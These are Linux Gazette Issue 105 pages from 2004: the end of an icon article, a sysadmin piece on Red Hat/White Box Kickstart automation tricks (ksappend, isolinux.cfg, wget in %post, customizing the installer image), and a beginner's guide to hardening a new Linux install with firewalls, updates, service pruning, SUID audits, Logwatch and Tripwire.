icons are the same size - 48x48 will probably suit most people -
they'll be uniformly spaced, but if there are variations in size
they can appear to be a little uneven.


</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<P>
<img ALIGN="LEFT" ALT="[BIO]" SRC="../gx/2002/note.png" class="bio">
<em>
John is  a part-time geek from Orange, Australia. He has been using
Linux for four years and has written several <a
href="http://users.netwit.net.au/~pursang/">Linux related
articles</a>.
</em>
<br CLEAR="all">
<!-- *** END bio *** -->

<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/murray.html">John Murray</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="nielsen"></a>
<h1>White Box Linux Kickstart Tricks</h1>
<p id="by"><b>By <A HREF="../authors/nielsen.html">Mark Nielsen</A></b></p>


</b>
</p>


<p>
<!-- 27July2004 dsrich
I reverted back to the original article at one point after having committed some changes,
so there might be some wierdness if you look at diffs.
-->
<ol>
  <li><a href="#Introduction">Introduction</a></li>
  <li><a href="#Kickstart">Kickstart walk through</a></li>
  <li><a href="#kickpost">KickPost trick</a></li>
  <li><a href="#dhcp">DHCP Stupidity + ksappend Trick</a></li>
  <li><a href="#cdrom">Boot installation cdrom</a> </li>
  <li><a href="#boot">Boot prompt options</a></li>
  <li><a href="#wget">pre and post tricks with wget</a></li>
  <li><a href="#install">Kickstart tricks with the installer: ssh, bash, and other binaries</a> </li>
  <li><a href="#improve">Things to improve</a></li>
  <li><a href="#conclusion">Conclusion</a></li>
</ol>

<h3><a name="Introduction"></a>Introduction</h3>
<strong>What is White Box?</strong> <a href="http://whiteboxlinux.org/">White Box
Enterprise Linux</a> is just RedHat's Enterprise Server 3 recompiled from
the source RPMs RH provides. Just for kicks, I ran a md5sum comparison
between the RH RPMs and WhiteBox RPMs, and in almost all cases, they were
identical. Most of the mismatches were related to trademark logos and such
or were RPMs that WhiteBox didn't need.
<p>
White Box is very good for testing and developing since it doesn't
require any licenses to use. It also should be considered for
production use. Please consider contributing towards the White Box. 
It is a great project!
<p>
<strong>What is Kickstart?</strong> A means of automating Linux installations
and upgrades. First, you create a single configuration file which
you put on a floppy disk. Then, you boot your computer from the floppy disk, and
it will be configured based on the Kickstart configuration file. 
If the configuration file is set up right, no questions or prompts are asked
during the installation.
<p>
<strong>So what are the Kickstart tricks?</strong> In this article, I'm
going to talk about the experience I've gained using Kickstart during the
last 6 years and in the course of my work at <a
href="http://www.nuasis.com/">Nuasis</a>
as a Systems Administrator and Programmer.<p>
Please read the following manual before reading the rest of this
article.
<ol>
  <li><a
 href="https://www.redhat.com/docs/manuals/linux/RHL-9-Manual/custom-guide/">
 https://www.redhat.com/docs/manuals/linux/RHL-9-Manual/custom-guide/</a></li>
</ol>

<h3><a name="Kickstart"></a>Kickstart walk through</h3>
To me, this is what Kickstart does:
<ol>
  <li>You stick in your boot floppy or boot cdrom.</li>
  <li>It brings you to the isolinux boot prompt (similar to lilo). You
can override various settings. 
  </li>
  <li>It boots from the media. 
  </li>
  <li>Installs a shell and the installation software from an image
(from the media or the net).
  </li>
  <li>Tries to get the Kickstart file (ks.cfg), whether it is on the net or on
your media.</li>
  <li>Starts the installation.</li>
</ol>

<h3><a name="kickpost"></a>KickPost trick</h3>
There is a neat trick you can do to your ks.cfg file. An undocumented
feature which works just fine is the ability to include another ks.cfg
file in your ks.cfg file. Put something like this
<pre>
%ksappend http://10.10.10.10/include_this_file.ks
</pre>
into your ks.cfg file. It will probably also work with another file on the
floppy disk or cdrom (but why would you do that?).
<p>

<h3><a name="dhcp"></a>DHCP Stupidity + ksappend Trick</h3>
By setting <code>append ip=dhcp</code>
in the isolinux.cfg file of the boot floppy or cdrom, or by typing in
"ip=dhcp" at
the boot prompt, you can boot your computer from a DHCP server for
Kickstarting
purposes. The Kickstart process will also try to use DHCP if you try to get
something from the net and the network settings were not specified. 
NOTE: The ip address during Kickstart doesn't have to be the same as
when
the computer reboots after installation.
<p>Besides setting up the network settings, DHCP has the capability of
telling your computer where to get the Kickstart file. Here is the
problem: The installation program has no way of getting a file except
through NFS. Trying to pass a url for a the location of the file won't work.
I hate
NFS. I have always had problems with it. I prefer to use a web server
for Kickstarts. </p>
<p>There are two solutions around this:

<ol>
  <li>issue the <tt>ks=http://somewhere.com/myconfig.ks</tt> command at boot
time or in the isolinux.cfg file located on the boot floppy or boot
cdrom. <br>
  </li>
  <li>Use the kickpost command in a generic Kickstart file. <br>
  </li>
</ol>
If you decide to use the kickpost command in the Kickstart file, then
leave the ks.cfg file on your boot media as generic as possible. The
kickpost command in the Kickstart file will download the rest of your
Kickstart file. <p>
Thus, the ks.cfg file located on the floppy or cdrom would look like
this:
<pre class="code">
keyboard us
lang en_US
langsupport en_US
network --bootproto=dhcp
%ksappend http://10.10.10.10/include_this_file.ks
</pre><p>
The isolinux.cfg file would look like<br>
<pre class="code">
default my_default
prompt 1
timeout 600
display boot.msg
F1 boot.msg
F2 options.msg
F3 general.msg
F4 param.msg
F5 rescue.msg
F7 snake.msg
label my_default
  kernel vmlinuz
  append ip=dhcp initrd=initrd.img 
  kssendmac ksdevice=eth0 lang=en_US
label linux
  kernel vmlinuz
  append ks initrd=initrd.img
label text
  kernel vmlinuz
  append initrd=initrd.img text
label expert
  kernel vmlinuz
  append expert initrd=initrd.img
label ks
  kernel vmlinuz
  append ks initrd=initrd.img
label lowres
  kernel vmlinuz
  append initrd=initrd.img lowres</pre>
Thus, you can get around the fact that DHCP can't send a url as the location
of your Kickstart file. 
Also, <tt>include_this_file.ks</tt>
doesn't have to be a text file. It could be a script which prints out
the correct Kickstart file based on the ip or MAC address. 
<p>
Another trick -- let the DHCP server be a DNS server as well. 
<br>If your include command is something like this:
<pre>%ksappend http://Kickstart.foo/include_this_file.ks</pre>
Then have DHCP point to itself to be the DNS server, and it can assign
an ip address for "Kickstart.foo" (which could be itself).
 This enables you use an arbitrary
server. Practically, you would probably have the dhcp, dns, and Kickstart
services run on the same computer. 
<p>

<h3><a name="cdrom"></a>Boot installation cdrom</h3>
If you want to create your own bootable cdrom for installation, then
please read the link below. This eliminates the need to use floppies.
Another nice thing to do is have your computer eject the cdrom and reboot.
(Assuming
your rack mount server doesn't reload your cdrom after a reboot) you start the
Kickstart, walk away and go to lunch, come back, and your computer is
ready to be used. If your computer loads the cdrom after a reboot, then
you don't want to do that. <br>
<a
 href="https://www.redhat.com/docs/manuals/linux/RHL-9-Manual/install-guide/s1-steps-install-cdrom.html#S2-STEPS-MAKE-CD">
https://www.redhat.com/docs/manuals/linux/RHL-9-Manual/install-guide/s1-steps-install-cdrom.html#S2-STEPS-MAKE-CD</a>
<p>
A sample isolinux.cfg file for the bootable cdrom would look like this:
<br>
<pre class="code">
default my_default
prompt 1
timeout 600
display boot.msg
F1 boot.msg
F2 options.msg
F3 general.msg
F4 param.msg
F5 rescue.msg
F7 snake.msg
label my_default
  kernel vmlinuz
  append ks=http://10.10.10.10/Kickstart/wb.ks ip=10.10.10.100 gateway=10.10.10.1 netmask=255.255.255.0 dns=10.10.10.50 initrd=initrd.img kssendmac \
  ksdevice=eth0 lang=en_US
label linux
  kernel vmlinuz
  append ks initrd=initrd.img
label text
  kernel vmlinuz
  append initrd=initrd.img text
label expert
  kernel vmlinuz
  append expert initrd=initrd.img
label ks
  kernel vmlinuz
  append ks initrd=initrd.img
label lowres
  kernel vmlinuz
  append initrd=initrd.img lowres</pre>
<br>
Now how do you eject the cdrom at the end of the installation?
Put <tt>reboot</tt> as an option in your ks.cfg file if your computer doesn't
reload the cdrom after a reboot. 
Otherwise, put this at the end of the post section in your <tt>ks.cfg</tt> file. 
It will basically try to eject every IDE device. If it is a hard drive,
who cares, but if is a cdrom, it works.
If there is an easy way to do it with a normal command in Kickstart, I
missed it.
<pre class="code">
mkdir /mnt/hda
mkdir /mnt/hdb
mkdir /mnt/hdc
mkdir /mnt/hdd
mknod /dev/hda b 3 0
mknod /dev/hdb b 3 64
mknod /dev/hdc b 22 0
mknod /dev/hdd b 22 64
echo '/dev/hda /mnt/hda iso9660,ro 0 0
/dev/hdb /mnt/hdb iso9660,ro 0 0
/dev/hdc /mnt/hdc iso9660,ro 0 0
/dev/hdd /mnt/hdd iso9660,ro 0 0' &gt;&gt; /etc/fstab
/mnt/sysimage/usr/bin/eject /dev/hda
/mnt/sysimage/usr/bin/eject /dev/hdb
/mnt/sysimage/usr/bin/eject /dev/hdc
/mnt/sysimage/usr/bin/eject /dev/hdd</pre>

<h3><a name="boot"></a>Boot prompt options</h3>
Read these two docs. <br>
<ol>
  <li><a
 href="https://www.redhat.com/docs/manuals/linux/RHL-9-Manual/install-guide/ch-bootopts.html">https://www.redhat.com/docs/manuals/linux/RHL-9-Manual/install-guide/ch-bootopts.html</a></li>
  <li><a
 href="http://docs.rage.net/system/anaconda-9.0/command-line.txt">http://docs.rage.net/system/anaconda-9.0/command-line.txt</a></li>
</ol>
Whether you boot from a floppy disk or a cdrom, these two docs are very
useful. Basically, what you want to do is customize the isolinux.cfg
file located on the floppy disk or cdrom. For example, you can put in
the ip address, netmask, dns, gateway, and even the location of the
Kickstart file on the net. This can be very useful if you Kickstart a
computer over and over again and you don't have or want dhcp. You can
override these options at boot time. One idea is to create a generic boot
cdrom, and then at the boot prompt
 type in the ip address you want to use (if you
don't have a DHCP server).<p>
Here is a useful trick given the configuration below. The "wb.ks" file
on the web server doesn't have to be a text file. If can actually be a
script which detects the ip address or MAC address of the computer
being Kickstarted and print out the appropriate Kickstart file. Thus,
the url for the Kickstart file will stay the same, but the network
settings might change. This is useful if you don't have a DHCP server.
For Perl, look at the %ENV hash and for Python, look at the os.environ
dictionary, to get the ip address or the MAC address. 
You can also pass arguments in the url if you know what you are doing
 (for example, pass the host name, and then the perl or python script
can determine which Kickstart file to use if it doesn't recognize your
ip address or MAC address).
<p>
A sample isolinux.cfg file for the bootable cdrom would look like this:
<br>
<pre class="code">
default my_default
prompt 1
timeout 600
display boot.msg
F1 boot.msg
F2 options.msg
F3 general.msg
F4 param.msg
F5 rescue.msg
F7 snake.msg
label my_default
  kernel vmlinuz
  append ks=http://10.10.10.10/Kickstart/wb.ks ip=10.10.10.100 gateway=10.10.10.1 netmask=255.255.255.0 dns=10.10.10.50 initrd=initrd.img kssendmac \
  ksdevice=eth0 lang=en_US
label linux
  kernel vmlinuz
  append ks initrd=initrd.img
label text
  kernel vmlinuz
  append initrd=initrd.img text
label expert
  kernel vmlinuz
  append expert initrd=initrd.img
label ks
  kernel vmlinuz
  append ks initrd=initrd.img
label lowres
  kernel vmlinuz
  append initrd=initrd.img lowres</pre>
<br>

<h3><a name="wget"></a>pre and post tricks with wget</h3>
"wget" is a program which is available during installation time. It can
download files over the net. Why is this program useful during
Kickstart? In your ks.cfg file, you can use it to download files and
put it on your computer. Why is this useful? Well, if you can only
install an rpm after the computer has booted, then you can at least
download it during installation time. Then, if you are smart
enough, you can use a firstboot script to install the rpm the first
time the computer comes up. <p>
An example in the ks.cfg file would be:<br>
<pre>%post
wget -q -O /mnt/sysimage/usr/src/local/sompackage.rpm http://myserver.local/sompackage.rpm</pre>

<h3><a name="install"></a>Kickstart tricks with the installer:
ssh,
bash, and other binaries</h3>
Here is an advanced trick which you should only do if you are good at
Linux in general. You can basically install any piece of software into
your installation program. For example, you can install ssh and ssh to
a computer somewhere to you read your email while the computer is being
Kickstarted. Sometimes, I am trapped in our Network Operations Center at work, and I am bored
watching a Kickstart process, so I use ssh to connect to one of my
computers to do something useful. <p>
Below, I am going to show you how to install any binary file. You have
to be careful about how much space you use up. First off, the
installation program uses an image to get a lot of the binaries it uses
during installation. An example image is 
<a href="ftp://mirror.physics.ncsu.edu/pub/whitebox/3.0/en/os/i386/RedHat/base/netstg2.img">
ftp://mirror.physics.ncsu.edu/pub/whitebox/3.0/en/os/i386/RedHat/base/netstg2.img</a><p>
Now, what you do is modify this image. Here is an example script:<br>

<pre class="code">

### in case you run this script twice
mkdir -p mnt
umount mnt
rm -rf new_image
rm -f netstg2.img

  ## Get and mount the old image
wget -q -O netstg2_orig.img ftp://mirror.physics.ncsu.edu/pub/whitebox/3.0/en/os/i386/RedHat/base/netstg2.img
mkdir -p mnt
mount -o loop netstg2_orig.img mnt
  ## Make the new image directory
mkdir -p new_image

  ## rsync the old image to the new image
rsync -a mnt/* new_image/
 
  ## rsync a bunch of other stuff over
rsync -a /usr/sbin/ssh* new_image/usr/sbin/
rsync -a /usr/bin/ssh* new_image/usr/bin/
rsync -a /usr/bin/rsync* new_image/usr/bin/
rsync -a /usr/bin/nmap* new_image/usr/bin/
rsync -a /usr/bin/scp* new_image/usr/bin/
rsync -a /bin/bash new_image/usr/bin/

  ## Make a dependency list -- very crude
ldd /usr/sbin/sshd | cut -d ' ' -f3 | cut -d '.' -f1 &gt; List.dep
ldd /usr/bin/ssh | cut -d ' ' -f3 | cut -d '.' -f1 &gt;&gt; List.dep
ldd /usr/bin/nmap | cut -d ' ' -f3 | cut -d '.' -f1 &gt;&gt; List.dep
ldd /bin/bash | cut -d ' ' -f3 | cut -d '.' -f1 &gt;&gt; List.dep
ldd /usr/bin/rsync | cut -d ' ' -f3 | cut -d '.' -f1 &gt;&gt; List.dep
ldd /usr/bin/scp | cut -d ' ' -f3 | cut -d '.' -f1 &gt;&gt; List.dep
ldd /usr/bin/screen | cut -d ' ' -f3 | cut -d '.' -f1 &gt;&gt; List.dep

  ### execute the perl script to copy over the libraries
chmod 755 Copy_Lib.pl
./Copy_Lib.pl

  ### Make your image. 
mkcramfs --verbose new_image netstg2.img

  ### replace netstg2.img on the Kickstart server or cdrom 
  ### with the new one you just created.
</pre>
<p>
Here is the Copy_Lib.pl script:
<pre class="code">
#!/usr/bin/perl

open(FILE,&quot;List.dep&quot;);
my @Lines = &lt;FILE&gt;;
close FILE;
(@Lines) = grep($_ =~ /[a-zA-Z0-9]/, @Lines);

my $Home = &quot;new_image&quot;;
foreach my $Line (@Lines) {
    chomp $Line;
    my $Reverse = reverse $Line;
    my (@Temp) = split(/\//, $Reverse, 2);
    my $Dir = reverse($Temp[1]);
    print `mkdir -vp $Home/$Dir`;
    $Command = &quot;rsync -av --ignore-existing $Line* $Home/$Dir/&quot; ;
    $Command2 = &quot;rsync -av --copy-links --ignore-existing $Line* $Home/$Dir/&quot;;
    print &quot;$Command\n&quot;;
    print `$Command`;
    print &quot;$Command2\n&quot;;
    print `$Command2`;
}
</pre>
<p>
I had trouble changing the default shell to bash during the Kickstart. 
So, in the <tt>%pre</tt> section of the ks.cfg file, I entered this command:
<pre>cp /usr/bin/bash /</pre>
then when I clicked on Alt-F2 during installation time, I executed the
command:
<pre>./bash</pre>
and I got a good bash shell. 
<p>

Here is another interesting tidbit, you can also install a service. For
example, I tried to get sshd running during a Kickstart. I copied over
all the libraries, created a shadow password file, modified
/etc/passwd, and actually got sshd to run at Kickstart time
automatically. However, when I tried to connect to the computer being
Kickstarted, it would crash sshd running on that computer. Crashing
sshd didn't affect the Kickstart process. It wasn't important enough
for me to get it working, so I gave up.<p>If I actually could get
to work, I could watch the Kickstart process from my desktop.
 I think running an Apache web server should be fine.
I could setup the web server
with a few python scripts. Those scripts would report on the health of
the Kickstart process. That would be cool. Python already exists in the
Kickstart program. <br>


<h3><a name="improve"></a>Things to improve</h3>
There are only two things in Kickstart which upset me, and either I can
live without. <br>
<ol>
  <li>You can't send a host name request to the DHCP server (you
would have to change the boot options of your install media to do this
if it were possible). The only thing the DHCP server can do is match
your computer by its MAC address. With the normal dhclient program
(after you have installed Linux) you can make a host name request, but
not during Kickstart (maybe we should copy over the dhclient
software onto the netstg2.img file and execute dhclient in the
%pre section of the ks file?). If you know how to setup the
dhcp server, it can return the correct fixed ip address even without
knowing the MAC address. It is beyond the scope of this article to
explain how to do that. <br>
  </li>
  <li>DHCP only lets you get the Kickstart file from an NFS server.
This is not a problem with DHCP but with the Kickstart process.
It should be able to return a url and the installer
should be able to detect the url and download  the ks file. It looks
like it should be very easy to edit the source code of Anaconda to make
it do just that. I briefly looked at the source code and everything is
there to download files from a web or ftp server, so it is just a
matter of someone doing it.</li>
</ol>
My complaints above actually affect my work. Because DHCP relied
heavily on the MAC address, and we couldn't get MAC addresses ahead of
time, we ended up not using DHCP for one solution. That was
unfortunate. <br>
<h3><a name="conclusion"></a>Conclusion</h3>
Overall, I have been pleased with Kickstarting computers. It has proven to 
be a very powerful tool. 
<p>
I pretty much have no future plans with Kickstart except to contribute
to the <A href="http://linux.duke.edu/projects/yum/">Yum</a>
 project by making a Yum server capable of making Kickstart configurations
 and managing Yum repositories. My dream is to replace
RH satellite servers with Yum servers.
I would of course use the Python
programming language to do this, as it is my favorite programming language
and Yum is already written in Python (yeah!). 


</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<P>
<img ALIGN="LEFT" ALT="[BIO]" SRC="../gx/2002/note.png" class="bio">
<em>
Mark Nielsen was enjoying his work at cnet.com as a MySQL DBA, but
is moving to Google as a MySQL DBA.   
During his spare time, he uses Python heavily for mathematical and web
projects.
</em>
<br CLEAR="all">
<!-- *** END bio *** -->

<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/nielsen.html">Mark Nielsen</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="odonovan"></a>
<h1>Securing a New Linux Installation</h1>
<p id="by"><b>By <A HREF="../authors/odonovan.html">Barry O'Donovan</A></b></p>


</b>
</p>


<p>
<h3>Introduction</h3>

From a security professional's perspective, a number of common
Linux distributions are insecure &quot;out of the box&quot;, and many of the
supplied packages are already out of date by the time they reach
the shelves. As the security of one's computer and more importantly
its data is a priority concern, there are a number of steps that
should be taken at the time of installation to secure one's
operating system as well as to help identify attempted or
successful attacks. 

<p>These steps are listed below and each is expanded on in detail
in the sections that follow.</p>

<ol>
<li><a href="#install">Installation and configuration of an
effective firewall</a></li>

<li><a href="#update">The (automatic) updating of all installed
packages</a></li>

<li><a href="#services">Stopping and disabling of all unnecessary
services</a></li>

<li><a href="#SUID">Locating and removing/altering unnecessary
SUID/SGID's</a></li>

<li><a href="#tools">Logwatch and Tripwire</a></li>
</ol>

<h3 id="install">1. Installing and Configuring a Firewall</h3>

A properly configured and effective firewall policy is not only
your first line of defense but it is also your most important. Any
potential (remote) attacker that cannot breach your firewall will
not be able to exploit any of the possible vulnerabilities of the
underlying services that are protected by it. 

<p>The firewall should be set-up <strong>before</strong> you
connect you new Linux installation to the internet for the
first-time. Configure it to deny all incoming packets except those
that are <code>ESTABLISHED</code> or <code>RELATED</code>. This
will provide maximum protection while you carry out the rest of the
steps to secure your installation. Once you have completed all of
the steps you can then configure your firewall policy as you
require.</p>

<p>I introduced the basic concepts of <code>iptables</code>, the
built-in firewall of the Linux kernel, and gave a number of example
configurations for various scenarios in &quot;<a href=
"http://www.linuxgazette.net/103/odonovan.html">Firewalling with
netfilter/iptables</a>&quot; from issue #103 of the Gazette. I strongly
recommend you read through this article and use it to complete
this step.</p>

<h3 id="update">2. Update All Installed Packages</h3>

A standard Linux distribution can come bundled with well over 1,000
packages and many of these will have had newer versions released by
the time you install them. Most of these updates will be feature
enhancements and bug fixes, but some will also be security fixes,
and some of these security fixes may be serious. Ensuring that all
of the installed packages are at their newest versions is not just
a job at installation but rather one that must be continued
throughout the lifetime the new installation. This can be a very
time consuming job and luckily there are a number of utilities that
can do this for us automatically. The two most common utilities
used are APT (Advanced Package Tool) and Yum (Yellowdog Updater,
Modified). 

<p>Some distributions may provide their own utilities and in those
cases you may find it easiest to just install them and use them as
pre-configured. For example RedHat and Fedora distributions come
with <code>up2date</code> and the Debian distribution uses APT by
default.</p>

<p>If you have or want to install one yourself I would recommend
APT which can be used with any RPM-based Linux distribution. You
will also need to locate a repository containing the new/updated
packages for you distribution from where APT can download and
install them. A quick internet search with the name of your
distribution and 'apt' or 'apt-get' should locate an APT binary RPM
and a repository for you. See the links following this article for
some useful sites and repositories.</p>

<p>Once you have APT installed and the repositories set-up (usually
<code>/etc/apt/sources.list</code> or similar), its use is trivial
and involves only two commands (run as root):</p>

<pre>
$ apt-get update
$ apt-get upgrade
</pre>

The first command downloads the latest package information from the
repository and the second uses this information to download and
install newer versions of already installed packages if available.
These commands should be performed regularly to ensure your system
is always up-to-date. 

<p>If you wish to ensure maximum security you should always try to
use official repositories containing signed packages; this is best
accomplished by using the default auto-updater supplied by the more
popular distributions. When downloading individual packages and
files from the internet, always try and use <code>md5sum</code>
(c.f. <code>man md5sum</code>). An MD5SUM is a hash/checksum of a
file and most download sites publish the MD5SUMs of the files they
have available for download; comparing these with the ones you
generate from the downloaded file will help ensure that you have an
not downloaded a trojaned version of the package/file.</p>

<p>Finally, you should strongly consider subscribing to your
distribution's security mailing list. These are usually low-volume
lists and you will be informed by e-mail whenever a new package is
released that fixes a vulnerability.</p>

<h3 id="services">3. Stop and Disable All Unnecessary Services</h3>

A new installation of many Linux distributions will have many
services/daemons configured to start each time you boot your
machine. Some of these might include the HTTP (web server),
POP3/IMAP (e-mail) daemons, a database server, etc. Many of these
will be unnecessary for many users and can offer a potential
attacker many routes to infiltrate your new operating system. You
should go through each of them and stop <strong>and
disable</strong> all of those you don't need. 

<p>The bigger and more common distributions will probably have a
GUI application for configuring these services; try looking in the
Settings or System menus of your desktop's application menu for
this.</p>

<!-- 
dsrich 25July2004 - chkconfig and service apparently ship with RedHat,
so I changed the wording in the next paragraph to reflect this.  A 
version of the chkconfig utility appears to be available from
http://www.buttsoft.com/~thumper/software/sysadmin/chkconfig/
This utility only works on SysV-derived /etc/rc.d/rc.#/... arrangements,
not BSD versions like my Slackware, so I could not test it.
-->

<p>On RedHat systems, the command line utility for configuring services
is called <code>chkconfig</code>. To list the current status of all
installed services, execute (as root):</p>

<pre>
$ chkconfig --list
</pre>

which will generate something similar to: 

<pre>
iptables        0:off   1:off   2:on    3:on    4:on    5:on    6:off
sshd            0:off   1:off   2:on    3:on    4:on    5:on    6:off
sendmail        0:off   1:off   2:on    3:on    4:on    5:on    6:off
httpd           0:off   1:off   2:on    3:on    4:on    5:on    6:off
 ...             ...     ...     ...     ...     ...     ...     ...
 ...             ...     ...     ...     ...     ...     ...     ...
smb             0:off   1:off   2:off   3:off   4:off   5:off   6:off
squid           0:off   1:off   2:off   3:off   4:off   5:off   6:off
xinetd based services:
        chargen-udp:    off
        rsync:          off
        chargen:        off
          ...           ...
          ...           ...
        sgi_fam:        on
</pre>

<p>The numbers (0 through 6) preceding the colons represent the
system &quot;run-levels&quot; where the two of usual concern are 3 and 5; if
your system boots to a console (no GUI) then it runs in level 3
whereas if it boots to a GUI it runs in level 5.</p>

<p>To enable a service (say <code>squid</code>) in run-levels 2,3,4
and 5 we would execute (as root):</p>

<pre>
$ chkconfig --level 2345 squid on
</pre>

and to disable a service (say <code>sshd</code>) in levels 3 and 5
we would execute (as root); 

<pre>
$ chkconfig --level 35 sshd off
</pre>

<p>If you do not know what a particular service that is enabled is
or does then try an internet search or try using the
<code>man</code> command with the service name as a keyword
(<code>man -k</code>). Some of the GUIs may offer an explanation of
what the services are.</p>

<p>The <code>chkconfig</code> command will enable/disable services
the next time you boot your computer but it won't have any effect
on whether or not a service is currently running.
Under RedHat, we use the <code>service</code> command as follows:</p>

<pre>
$ service service_name start
$ service service_name stop
$ service service_name restart
$ service service_name status
</pre>

where <code>service_name</code> is the same as those reported by
<code>chkconfig --list</code>. 

<p>You can run <code>netstat -l</code> after disabling all
unnecessary services to ensure you got them all (it checks what
sockets are listening for connections). For the services which you
do keep running, ensure that they are correctly (and restrictively)
firewalled and configured.</p>

<h3 id="SUID">4. Locate and Remove/Alter Unnecessary SUID/SGID's</h3>

A SUID (set user ID) or a SGID (set group ID) program
is one that allows an ordinary user to execute it with elevated
privileges. A common example is the <code>passwd</code> binary
which, among other functions, allows an ordinary user to change
their login password. However, these passwords are stored in a file
that can only be altered (and sometimes read) by the root user and,
as such, non-root users should be unable to change their passwords.
The access privileges for this binary are: 

<pre>
-r-s--x--x  1 root root 18992 Jun  6  2003 /usr/bin/passwd
</pre>

As you can see, the owner execute bit is set to '<code>s</code>'
instead of the usual '<code>x</code>', making the binary SUID; i.e.
when an ordinary user executes <code>passwd</code>, it will run
with the privileges of the file's owner - in this case the root
user. 

<p>Many SUID/SGID executables are necessarily so, such as
<code>passwd</code> above. However many others are not. SUID/SGID
programs can be exploited by malicious local users to gain elevated
privileges on your system. Run the following command as root to
find all of these executables:</p>

<pre>
find / \( -perm -4000 -o -perm -2000 \)
</pre>

or for a more detailed list use: 

<pre>
find / \( -perm -4000 -o -perm -2000 \) -exec ls -ldb {} \;
</pre>

<p>We must now go through this list and try to reduce these files
that are owned by root or in the root group to the bare minimum by
either removing unnecessary SUID/SGID binaries and/or removing the
SUID/SGID bit.</p>

<p>Packages containing SUID/SGID executables that you are unlikely
to use can be removed by first finding the package with, say,
<code>rpm -q --whatprovides /usr/sbin/kppp</code> and then removing
it with <code>rpm -e package-name</code>.</p>

<p>The SUID/SGID bit can be removed with, for example, <code>chmod
-s /usr/sbin/kppp</code>. The executable can then be run by the
root user when needed.</p>

<h3 id="tools">5. Logwatch and Tripwire</h3>

Although we may do our best to secure our system, the reality of
the situation is that no matter how much effort we make we will
never be completely secure. Rather than burying our heads in the
sand and hoping for the best, there are a few other things we can
do to ensure that we know if and when our system is compromised. 

<p>One intrusion detection program that is often underestimated and
under used is Tripwire (<a href=
"http://www.tripwire.org/">http://www.tripwire.org/</a>). This
program checks your system's files periodically to see if they have
been changed. If any have that should not have, Tripwire will
generate a report for you to act on. Tripwire takes a little time
to configure and set up properly but it is well worth the effort;
Tripwire helped me to identify an intrusion on a server I was
administering a couple of years back. I will cover the proper
installation and configuration of Tripwire in next month's
article.</p>

<p>An invaluable source of information on what is going on in the
background of your computer are the log files (usually in 
<code>/var/log</code>). All logging on a Linux system is handled by
the <code>syslogd</code> daemon and its configuration file
<code>/etc/syslog.conf</code>. The configuration file specifies
what facilities or subsystems to record messages from (e.g. cron,
daemon, mail, etc), what level of messages to log (e.g. debug,
info, warn, etc) and what to do with these messages (append to log
file, send to printer, etc). If you wish to change the default
configuration you will find a lot of information in the various man
pages (<code>syslogd</code>(8), <code>syslog.conf</code>(5),
<code>syslog</code>(2), <code>syslog</code>(3) and more).</p>

<p>Syslog also allows remote logging; placing your log files on
another networked system. The advantage of this is that if your
system is compromised by someone they will be unable to remove
their steps from your logs making the tracing of their origin and
their actions all the easier.</p>

<p>Unfortunately there is far too much information in the various
log files for the average user to assimilate each day and for this
reason we turn to Logwatch. Logwatch (<a href=
"http://www.logwatch.org/">http://www.logwatch.org/</a>), as
described by its authors, &quot;parses through your system's logs for a
given period of time and creates a report analysing areas that you
specify, in as much detail as you require.&quot;</p>


<p>Logwatch is installed with most common distributions as standard
and by default it will usually generate daily reports and e-mail
them to the root user. As these reports are usually short they
should be read every day. They will highlight, depending on its
configuration, such information as invalid login attempts, network
connections to various daemons such as SSHD, possible port scans,
etc. Its configuration file is usually located in
<code>/etc/log.d/conf/logwatch.conf</code> and it is well
documented with comments to help you out.</p>

<p>There are a number of other intrusion detection systems you
might like to consider, such as Snort - <a href=
"http://www.snort.org/">http://www.snort.org/</a>, and you can
easily find them with a quick internet search.</p>

<h3>Closing Remarks</h3>

Security is not something that you consider at installation and
then put on the back burner; rather it <strong>must be</strong>
something that is always on your mind in everything you do; whether
it be ensuring your system is up-to-date, ensuring proper password
policies, governing whom you grant access to your system to and
what level of access, reading your daily logs, checking the
tripwire reports, reading the security mailing list of you Linux
distribution, etc. There is an old saying that is hugely relevant
to computer security: 
<em>&quot;A chain is only as strong as the weakest link&quot;</em>.
 It can just take one lapse of effort or
concentration on your part to open one security hole and all your
effort will be wasted. 

<p>This article covers the basics - the important procedures that
every user should do. There is always more that <em>can be
done</em> but each person will have to weigh up the potential
advantage against the cost in terms of the time and the effort
involved.</p>

<p>Some final nuggets of advice:</p>

<ul>
<li><strong>Never ever</strong> use telnet, ftp or any other
plain-text remote sessions that involve typing a user name or a
password. You should <strong>always and only</strong> use ssh, sftp
and similar utilities.</li>

<li>Have different user names/passwords for logging into unencrypted
(http) and encrypted (https) web pages and <strong>never
ever</strong> use the same user names and passwords that you use for
logging into your computers.</li>

<li><strong>Always</strong> use a restrictive firewall policy;
<code>DROP</code> all connections be default and only open those
you need in an as restrictive manner as possible. For example if
you need to ssh into your computer from work and no where else then
only allow your work-based IPs through.</li>
</ul>

<h3>Links</h3>

<strong>APT</strong> 

<ul>
<li><a href=
"http://moin.conectiva.com.br/AptRpm">http://moin.conectiva.com.br/
AptRpm</a> - Conectiva's AptRpm port page</li>

<li><a href=
"http://apt4rpm.sourceforge.net/">http://apt4rpm.sourceforge.net</a>
- General server-side information and Perl scripts to create
repositories. Also contains a list of repositories for various
distributions but many may be out of date.</li>

<li><a href=
"http://www.nongnu.org/synaptic/">http://www.nongnu.org/synaptic/</a>
- Synaptic (apt graphical front end) home page</li>

<li><a href=
"http://apt.freshrpms.net/">http://apt.freshrpms.net/</a> - Apt
RPMs and repositories for Fedora, RedHat and Yellow Dog</li>

<li><a href=
"http://www.usr-local-bin.org/apt.php">http://www.usr-local-bin.org
/apt.php</a> - Instructions and a repository for SuSE Linux</li>
</ul>

